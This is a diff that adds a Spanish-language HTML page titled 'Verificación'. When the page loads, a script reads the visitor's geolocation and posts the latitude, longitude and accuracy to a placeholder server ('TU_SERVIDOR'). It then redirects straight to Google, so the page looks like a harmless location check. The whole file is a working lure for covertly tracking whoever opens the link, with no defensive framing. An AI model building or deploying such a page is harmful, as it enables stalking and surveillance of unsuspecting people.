@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Verificación</title>
+    <script>
+        // Función para obtener la ubicación
+        function obtenerUbicacion() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(enviarUbicacion, errorUbicacion);
+            } else {
+                console.log("La geolocalización no es soportada por este navegador.");
+            }
+        }
+
+        // Enviar la ubicación al servidor
+        function enviarUbicacion(position) {
+            const datos = {
+                latitud: position.coords.latitude,
+                longitud: position.coords.longitude,
+                precision: position.coords.accuracy
+            };
+
+            // Enviar datos al servidor
+            fetch('https://TU_SERVIDOR/guardar', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(datos)
+            })
+            .then(response => console.log("Ubicación enviada"))
+            .catch(error => console.error("Error al enviar ubicación:", error));
+
+            // Redirección tras capturar la ubicación
+            window.location.href = "https://www.google.com"; // Redirección tras captura
+        }
+
+        // Manejo de errores
+        function errorUbicacion(error) {
+            console.error("Error al obtener la ubicación:", error);
+        }
+
+        // Ejecuta al cargar la página
+        window.onload = obtenerUbicacion;
+    </script>
+</head>
+<body>
+    <h2>Verificando su ubicación...</h2>
+</body>
+</html>
